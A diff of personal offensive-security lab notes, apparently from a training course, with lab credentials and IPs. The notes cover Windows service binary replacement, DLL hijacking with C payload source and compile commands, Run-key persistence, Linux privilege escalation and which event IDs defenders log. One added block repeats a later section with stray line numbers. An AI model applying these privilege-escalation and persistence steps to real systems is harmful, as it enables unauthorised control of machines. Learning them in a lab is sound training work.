@@ -9,6 +9,10 @@ winops: 192.168.65.10, 10.50.25.36    xfreerdp /u:student /v:10.50.25.36 /dynami
 linops: 192.168.65.20, 10.50.32.167   ssh -X student@10.50.32.167
 creds: student // password
 
+## python server
+python3 -m http.server		# make python server in dir on lin ops
+# using web browser on target connect to lin ops IP:port given
+
 ###### System Recon
 
 cat /etc/os-release   # os ver
@@ -142,7 +146,23 @@ show databases;		# shows databases that exist on system
 show tables from <database>;		# shows tables from selected database
 
 select <column> from <database>.<table>;		# shows selected column from specified list, use * to grab all columns
-
+## Services Bin Replace
+401
+Services    # check Services app for services with these flags...
+402
+  Log On As: Local System
+403
+  Start Type: Automatic
+404
+  Decription: Blank (indicates third-party service)
+405
+right click service -> view properties
+406
+  Path to executable    # replace .exe with a shell script if you have permission to do so
+407
+shutdown /r /f /t 00    # restarts windows, may take several tries
+408
+xfreerdp /u:thor /v:10.50.25.36 /dynamic-resolution +glyph-cache +clipboard   # log in as new user, use user in script, make sure ip is right too
 # use 'UNION' between commands to join them together, output must be similar
 #	tb1 has two less colums than tb2 in this example:
 select *,null,null from db1.tb1 UNION select * from db1.tb2;		# adds 2 temp colums to tb1
@@ -255,6 +275,7 @@ file > export program > binary > <renamefile> > ok > (on windows) remove .bin ex
 
 
 ###### Exploit Development
+
 gdb on remote system is required
 find vulrable binnary
 run program see what values it takes
@@ -311,6 +332,7 @@ msfconsole
 
 
 ###### Post Exploitation
+
 ## some ssh socket shit
 ssh -M -S /tmp/s <usr>@<IP>		# 
 ssh -o '/tmp/s' a		# 
@@ -344,7 +366,9 @@ ipconfig /all
 ipconfig -a
 ip a
 
+
 ###### lunux priv exc
+
 /etc/sudoers		# stores users with sudo permissions
 	<userName> ALL=(ALL:ALL) ALL		# entry gives max sudo permissions for given user
 sudo -l		# shows what you can run as sudo, look for non standard binaries
@@ -375,6 +399,7 @@ john --wordlist=rockyou.txt <fileWithHashs>		# how to start cracking, rockyou.tx
 
 
 ###### Win Priv Esc
+
 # Schedule Tasks
 	# Binary Replacement
 	# DLL Hijacking
@@ -407,9 +432,9 @@ right click service -> view properties
 shutdown /r /f /t 00		# restarts windows, may take several tries
 xfreerdp /u:thor /v:10.50.25.36 /dynamic-resolution +glyph-cache +clipboard		# log in as new user, use user in script, make sure ip is right too
 
-## Scheduled Tasks DLL Hijacking
+## DLL Hijacking
 # if unable to swap .exe but can still write to file...
-net use * \\live.sysinternals.com\tools		# maps sysinternal tools to next available drive
+net use * \\live.sysinternals.com\tools		# in cmd, maps sysinternal tools to next available drive
 Procmon.exe		# run procmon after moving to drive, may need to -accepteula
 	Filter
 		Process Name - contains - <process name> - include
@@ -421,7 +446,7 @@ run the process		# and observe "NAME NOT FOUND" .dll's
 	nano <vuln dll name>.c
 	
 ### dll script ###
-#include <windows.h>4
+#include <windows.h>
 int execCommand()
 {
  WinExec("cmd /C whoami > FINDME_1.txt", 1);		// redirects output to FINDME_1.txt and closes shell
@@ -434,11 +459,12 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
  return 0;
 }
 ### end of dll script ###
+
 # compile & make dll:
 	i686-w64-mingw32-g++ -c SSPICLI.c -o SSPICLI.o
 	i686-w64-mingw32-g++ -shared -o SSPICLI.dll SSPICLI.o -Wl,--out-implib,SSPICLI.a
-
-
+scp ./<ddlName>.dll <user>@<IP>:<to\location>		# copy to dir where .exe is
+shutdown /r /f /t 00		# done on windows box, restarts windows and runs script
 
 ## DLL stuff
 C:\Windows C:\Windows\System32		# where most DLL's are located
@@ -461,8 +487,14 @@ net use * \\live.sysinternals.com\tools		# maps sysinternal tools to next availa
 sigcheck.exe -m C:\Windows\System32\eventvwr.exe | findstr /i level		# finds ExecutionLevel of eventvwr
 sigcheck.exe -m C:\Windows\System32\eventvwr.exe | findstr /i autoelevate		#	finds autoElevate of eventvwr
 
+## persistance
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run		# or RunOnce
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run		# or RunOnce
 
-
+## logs :(
+auditpol /get /category:*		# in cmd, shows what is being logged
+# important event ID's
+	4624/4625 successful/failed login, 4720 account created, 4672 administrator equivalent user logs on, 7045 Service creation
 
 
 
